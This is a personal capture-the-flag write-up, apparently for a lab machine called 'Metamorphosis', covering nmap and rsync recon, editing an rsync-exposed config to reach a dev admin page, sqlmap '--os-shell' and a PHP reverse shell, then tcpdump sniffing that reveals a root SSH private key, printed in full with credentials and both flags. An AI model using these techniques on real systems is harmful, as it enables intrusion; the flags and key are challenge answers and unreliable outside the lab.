# Metamorphosis
2021-23-09

## Initial info

## Recon

### Nmap

```PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-09-23T19:54:04+00:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2021-09-23T19:54:04
|_  start_date: N/A
```

### smbclient -L $IP
```
Password for [MYGROUP\lerusse]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.121.253]

	Workgroup            Master
	---------            -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.121.253]
```
### Rsync enum
```bash
rsync -rdt rsync://10.10.121.253:873
Conf    All Confs
```
```bash
rsync -rdt rsync://10.10.121.253:873/Conf

drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini
```
## Findings

### Directories using feroxbuster
- /admin (403)
- /admin/index.php (403)
    - This comment was found
    ```html
    <!-- Make sure admin functionality can only be used in development environment. -->
    ```
    - ~~Maybe using `dev.XXXX` subdomain?~~ nope
- /admin/config.php (200 but empty)
### Domains

### Files
webapp.ini:
    - env = prod
    - user = tom
    - password = theCat
### NetBIOS name
INCOGNITO

### Samba shares
IPC$

## Exploits
### Initial foothold
1. We can replace `env = prod` to `env = dev` to access the dev website environment via rsync
    1. We can now use the `tom` credentials to login to the admin page.
    2. The page doesn't give much so we'll intercept the request in burpsuite and sqlmap the result because i'm lazy.
2. We can get a shell running `sqlmap -r req.txt --level 2 --risk 2 --os-shell`
    1. We can then upload a php revshell
3. We finally start a pwncat listener

### Privesc
Our first shell is as `www-data`. The known password for user `tom` doesn't work.

We then run pspy64 to view what's running since there's nothing obvious yet. 

```
2021/09/23 20:41:09 CMD: UID=0    PID=821    | /usr/bin/python3 /root/serv.py
2021/09/23 20:42:01 CMD: UID=0    PID=3004   | /bin/sh -c /root/req.sh
```

After f*cking arround we find that we can use tcpdump. At this point i guess it's not for nothing and i'll try to search the packets to find somethjing useful.

`tcpdump -i any -s 0 -w data.pcap`

From
`12	99.611746	127.0.0.1	127.0.0.1	HTTP	1884		HTTP/1.0 200 OK  (text/html)`
We find the following data which is an id_rsa for ssh connection ~~(as root?)~~ as root
```
GET /?admin=ScadfwerDSAd_343123ds123dqwe12 HTTP/1.1
Host: 127.0.0.1:1027
User-Agent: curl/7.58.0
Accept: */*

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1678
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Thu, 23 Sep 2021 20:50:01 GMT

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
```
## Crendentials

### Potential users

### User:Pass
- tom:theCat

## Questions
__user.txt__

4ce794a9d0019c1f684e07556821e0b0

__root.txt__

7ffca2ec63534d165525bf37d91b4ff4
